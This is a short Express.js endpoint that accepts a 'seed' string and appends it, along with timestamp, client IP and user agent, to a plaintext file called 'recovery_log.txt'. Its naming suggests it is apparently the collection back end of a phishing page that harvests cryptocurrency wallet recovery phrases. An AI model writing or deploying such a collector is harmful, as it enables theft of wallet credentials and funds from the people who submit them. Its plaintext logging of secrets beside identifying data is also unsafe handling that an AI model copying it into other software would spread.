app.post('/api/save', (req, res) => {
  const { seed } = req.body;

  if (!seed || typeof seed !== 'string') {
    return res.status(400).json({ success: false, error: 'Seed is required.' });
  }

  const timestamp = new Date().toISOString();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';

  const logEntry = `[${timestamp}] Seed: "${seed}" | IP: ${ip} | User-Agent: ${userAgent}\n`;

  // Determine storage directory (Railway volume or local /data/ directory)
  const LOG_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH || path.join(__dirname, 'data');
  const LOG_PATH = path.join(LOG_DIR, 'recovery_log.txt');

  // Create directory if it doesn't exist
  if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR, { recursive: true });
  }

  fs.appendFile(LOG_PATH, logEntry, (err) => {
    if (err) {
      console.error('Failed to write log:', err);
      return res.status(500).json({ success: false, error: 'Failed to save seed.' });
    }
    console.log(`Logged submission from ${ip}`);
    res.json({ success: true, message: 'Seed logged successfully.' });
  });
});
